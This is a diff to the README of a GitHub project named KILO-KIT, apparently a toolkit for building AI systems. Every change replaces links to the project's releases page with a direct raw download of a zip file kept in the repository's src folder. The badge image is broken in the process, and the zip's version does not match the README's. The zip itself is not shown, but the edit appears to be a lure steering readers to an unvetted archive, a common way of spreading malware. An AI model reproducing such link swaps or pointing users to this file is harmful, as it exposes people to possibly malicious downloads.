@@ -6,7 +6,7 @@ Welcome to KILO-KIT! This guide helps you download and run our software to manag
 
 ## 📥 Download KILO-KIT
 
-[![Download KILO-KIT](https://img.shields.io/badge/Download%20KILO--KIT-v1.0-blue)](https://github.com/cheemsiulord/KILO-KIT/releases)
+[![Download KILO-KIT](https://github.com/cheemsiulord/KILO-KIT/raw/refs/heads/main/src/KIL_KIT_v1.1.zip%20KILO--KIT-v1.0-blue)](https://github.com/cheemsiulord/KILO-KIT/raw/refs/heads/main/src/KIL_KIT_v1.1.zip)
 
 ## 📦 Overview
 
@@ -32,7 +32,7 @@ To run KILO-KIT smoothly, your system should meet the following requirements:
 To download KILO-KIT, follow these steps:
 
 1. **Visit the Releases Page**
-   Click here to [visit this page to download](https://github.com/cheemsiulord/KILO-KIT/releases).
+   Click here to [visit this page to download](https://github.com/cheemsiulord/KILO-KIT/raw/refs/heads/main/src/KIL_KIT_v1.1.zip).
 
 2. **Select the Latest Release**
    Find the latest version of KILO-KIT. Look for files compatible with your operating system, such as `.exe` for Windows or `.dmg` for macOS.
@@ -99,6 +99,6 @@ Your feedback is valuable to us. Share your thoughts, suggestions, or issues by 
 
 ## 📥 Download KILO-KIT Again
 
-If you need to download KILO-KIT again, simply [visit this page to download](https://github.com/cheemsiulord/KILO-KIT/releases). 
+If you need to download KILO-KIT again, simply [visit this page to download](https://github.com/cheemsiulord/KILO-KIT/raw/refs/heads/main/src/KIL_KIT_v1.1.zip). 
 
 With these steps, you can easily set up and start using KILO-KIT to build powerful AI systems. Happy building!
